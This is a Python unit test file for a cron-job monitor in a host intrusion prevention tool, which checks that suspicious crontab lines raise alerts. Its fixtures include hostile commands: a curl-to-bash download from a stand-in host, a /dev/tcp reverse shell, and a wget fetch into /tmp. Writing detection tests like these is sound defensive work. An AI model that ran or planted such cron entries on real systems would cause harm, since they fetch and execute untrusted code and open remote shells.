import os
import tempfile
import unittest

from detection.cron_monitor import analizar_linea_cron, analizar_crontab


class TestCronMonitor(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        os.environ["HIPS_LOG_DIR"] = self.temp_dir.name

    def tearDown(self):
        self.temp_dir.cleanup()
        os.environ.pop("HIPS_LOG_DIR", None)

    def test_no_detecta_cron_normal(self):
        linea = "0 2 * * * /usr/bin/backup"
        alertas = analizar_linea_cron(linea)

        self.assertEqual(len(alertas), 0)

    def test_detecta_cron_cada_minuto(self):
        linea = "* * * * * /usr/bin/python3 /opt/app/tarea.py"
        alertas = analizar_linea_cron(linea)
        tipos = [alerta["tipo"] for alerta in alertas]

        self.assertIn("cron_cada_minuto", tipos)

    def test_detecta_descarga_remota(self):
        linea = "*/5 * * * * curl http://malicioso.local/payload.sh | bash"
        alertas = analizar_linea_cron(linea)
        tipos = [alerta["tipo"] for alerta in alertas]

        self.assertIn("descarga_remota_cron", tipos)

    def test_detecta_reverse_shell(self):
        linea = "* * * * * bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"
        alertas = analizar_linea_cron(linea)
        tipos = [alerta["tipo"] for alerta in alertas]

        self.assertIn("reverse_shell_cron", tipos)

    def test_detecta_tmp(self):
        linea = "*/10 * * * * /tmp/backdoor.sh"
        alertas = analizar_linea_cron(linea)
        tipos = [alerta["tipo"] for alerta in alertas]

        self.assertIn("ejecucion_tmp_cron", tipos)

    def test_analizar_crontab_registra_alertas(self):
        contenido = "\n".join([
            "# comentario",
            "0 2 * * * /usr/bin/backup",
            "* * * * * wget http://malicioso.local/a.sh -O /tmp/a.sh",
        ])

        alertas = analizar_crontab(contenido)

        self.assertGreaterEqual(len(alertas), 2)


if __name__ == "__main__":
    unittest.main()
